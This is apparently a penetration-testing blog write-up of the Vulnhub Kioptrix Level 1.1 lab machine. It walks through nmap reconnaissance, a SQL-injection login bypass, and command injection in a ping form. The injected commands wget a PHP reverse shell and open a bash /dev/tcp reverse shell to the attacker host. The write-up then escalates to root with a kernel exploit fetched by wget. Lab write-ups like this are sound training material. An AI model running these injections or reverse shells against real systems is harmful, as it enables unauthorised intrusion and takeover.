---
title: "[Vulnhub] Kioptrix: Level 1.1 (#2) Write-up"
date: 2019-02-05
author: "Mars Cheng"
summary: "Overview This is a vulnerable machine from vulnhub, and the write-up refers some internet resources. If any mistake or suggestion, please let we konw. Thanks. Walkthrough 1. Inf..."
translationKey: "vulnhub-kioptrix-level-1-1-2-write-up"
slug: "vulnhub-kioptrix-level-1-1-2-write-up"
aliases:
  - /blog/2019/vulnhub-kioptrix-level-1-1-2-write-up/
  - /2019/vulnhub-kioptrix-level-1-1-2-write-up/
tags:
  - "Penetration Testing"
  - "Vulnhub"
  - "OSCP"
  - "Write-up"
---

## Overview

>This is a vulnerable machine from vulnhub, and the write-up refers some internet resources. If any 
mistake or suggestion, please let we konw. Thanks.


## Walkthrough

1. Information gathering 
2. Passing login page with SQL injection
3. Discover injection point and get reverse shell
4. Privilege escalation 

### 1. Information gathering
As usual, we firstly use Nmap to scan the machine which tool can discover machine port status, service, and version. 

The ssh and http are opend, so we try to find known exploit of OpenSSH 3.9p1 and Apache httpd 2.0.52, but no vulnerabilities can be exploited.

```java
[11:57:42] root:/ # nmap -A 192.168.2.22
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-27 11:57 CST
Nmap scan report for 192.168.2.22
Host is up (0.00058s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            635/udp  status
|_  100024  1            638/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2018-08-27T00:48:19+00:00; -3h09m48s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:53:19:4C (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: mean: -3h09m48s, deviation: 0s, median: -3h09m48s

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.2.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds
```




* Search openssh 3.9 exploit
```java
[11:59:40] root:/ # searchsploit openssh 3.9
Exploits: No Result
Shellcodes: No Result
Papers: No Result
```

* Search Httpd 2.0 exploit
```java
[12:00:30] root:/ # searchsploit httpd 2.0
------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                       |  Path
                                                                                     | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------- ----------------------------------------
Acme thttpd 1.9/2.0.x - CGI Test Script Cross-Site Scripting                         | exploits/cgi/remote/23582.txt
Acme thttpd 2.0.7 - Directory Traversal                                              | exploits/windows/remote/24350.txt
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi        | exploits/multiple/dos/19536.txt
D-Link DWL-G700AP 2.00/2.01 - HTTPd Denial of Service                                | exploits/hardware/dos/27241.c
OmniHTTPd 1.1/2.0.x/2.4 - 'test.php' Sample Application Cross-Site Scripting         | exploits/windows/remote/21753.txt
OmniHTTPd 1.1/2.0.x/2.4 - Sample Application URL Encoded Newline HTML Injection      | exploits/windows/remote/21757.txt
OmniHTTPd 1.1/2.0.x/2.4 - test.shtml Sample Application Cross-Site Scripting         | exploits/windows/remote/21754.txt
Omnicron OmniHTTPd 1.1/2.0 Alpha 1 - 'visiadmin.exe' Denial of Service               | exploits/windows/dos/20304.txt
Omnicron OmniHTTPd 2.0.4-8 - File Source Disclosure                                  | exploits/windows/remote/20886.txt
Omnicron OmniHTTPd 2.0.7 - File Corruption / Command Execution                       | exploits/windows/remote/20557.pl
RaidenHTTPD 2.0.19 - 'ulang' Remote Command Execution                                | exploits/windows/remote/4747.vbs
------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

The SSH and Web server are not vulnerability can be used
Then, we browse the web page, and find the login page





### 2. Passing login page with SQL injection
* We try SQL injection to pass the login authentication, and success pass authentication

![](https://i.imgur.com/6X8MW7k.png)


![](https://i.imgur.com/Ca0ufgr.png)



### 3. Discover injection point and get reverse shell

* We disvocer remote code execution vulnerability in parameter "id",and try to get reverse shell
![](https://i.imgur.com/szPwEYe.png)
![](https://i.imgur.com/oii4McV.png)



```java
POST /pingit.php HTTP/1.1
Host: 192.168.2.22
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.2.22/index.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

ip=8.8.8.8;wget http://192.168.2.13/php-reverse-shell.php &submit=submit
```
![](https://i.imgur.com/BVKwGb0.png)


```java
POST /pingit.php HTTP/1.1
Host: 192.168.2.22
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.2.22/index.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

ip=8.8.8.8;
bash -i >%26%20 /dev/tcp/192.168.2.13/1234 0>%26%201 &submit=submit
```
![](https://i.imgur.com/rAEZ7S9.png)


```java
[13:48:34] root:/ # nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.2.13] from kali [192.168.2.13] 56940
Linux kali 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64 GNU/Linux
 14:25:55 up  6:00,  1 user,  load average: 0.32, 0.20, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     :1       :1               Sat10   ?xdm?   4:09   0.00s /usr/lib/gdm3/gdm-x-session --run-script gnome-session
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
```
![](https://i.imgur.com/F2TBTCa.png)

### 4. Privilege escalation 
* Try to find linux kernel exploit to privilege escalation


```java
[16:05:33] root:html # searchsploit linux kernel 2.6 | grep -v 'dos' | grep 'Cent'
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalation     | exploits/linux/local/9545.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)            | exploits/linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)             | exploits/linux_x86/local/9542.c
Linux Kernel 2.6.32 < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation (1)                                                            | exploits/linux/local/25444.c
[16:05:40] root:html # cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c .
```

```java
bash-3.00$ lsb_release -a 
LSB Version:	:core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID:	CentOS
Description:	CentOS release 4.5 (Final)
Release:	4.5
Codename:	Final
bash-3.00$ wget http://192.168.2.13/9542.c
--00:56:47--  http://192.168.2.13/9542.c
           => `9542.c'
Connecting to 192.168.2.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/x-csrc]

    0K ..                                                    100%  360.08 MB/s

00:56:47 (360.08 MB/s) - `9542.c' saved [2643/2643]
```

![](https://i.imgur.com/FQKtAjY.png)

```java
bash-3.00$ ls
1397.c
9542.c
exploit
suggester.sh
bash-3.00$ head -n 20 9542.c
/*
**
** 0x82-CVE-2009-2698
** Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit
**
** Tested White Box 4(2.6.9-5.ELsmp),
** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),
** Fedora Core 4(2.6.11-1.1369_FC4smp), Fedora Core 5(2.6.15-1.2054_FC5),
** Fedora Core 6(2.6.18-1.2798.fc6).
**
** --
** Discovered by Tavis Ormandy and Julien Tinnes of the Google Security Team.
** Thankful to them.
**
** --
** bash$ gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c && ./0x82-CVE-2009-2698
** sh-3.1# id
** uid=0(root) gid=0(root) groups=500(x82) context=user_u:system_r:unconfined_t
** sh-3.1#
** --
bash-3.00$ gcc -o exploit 9542.c
9542.c:109:28: warning: no newline at end of file
bash-3.00$ ls
1397.c
9542.c
exploit
suggester.sh */
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)

```

![](https://i.imgur.com/kzuAwAE.png)
